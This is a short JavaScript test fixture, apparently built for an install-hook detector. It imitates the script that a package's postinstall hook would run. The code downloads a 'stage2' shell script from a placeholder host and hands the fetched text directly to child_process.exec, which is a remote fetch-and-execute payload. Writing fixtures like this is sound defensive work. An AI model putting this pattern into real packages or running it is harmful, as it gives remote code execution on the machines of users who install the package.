// inert fixture: the payload for supplychain_indirect/package.json's
// "postinstall" hook. The hook line ("node scripts/postinstall.js") is
// innocuous on its own; the danger is entirely in this file, which the
// install-hook detector must analyze by following the reference (§Part-A.3).
const https = require("https");
const { exec } = require("child_process");

https.get("https://payload.example.invalid/stage2.sh", (res) => {
  let body = "";
  res.on("data", (chunk) => { body += chunk; });
  res.on("end", () => {
    // fetched remote content is handed straight to a shell — the same
    // fetch+exec mechanism the inline-hook check already catches, just
    // expressed as library calls in a bundled file instead of a shell pipe.
    exec(body);
  });
});
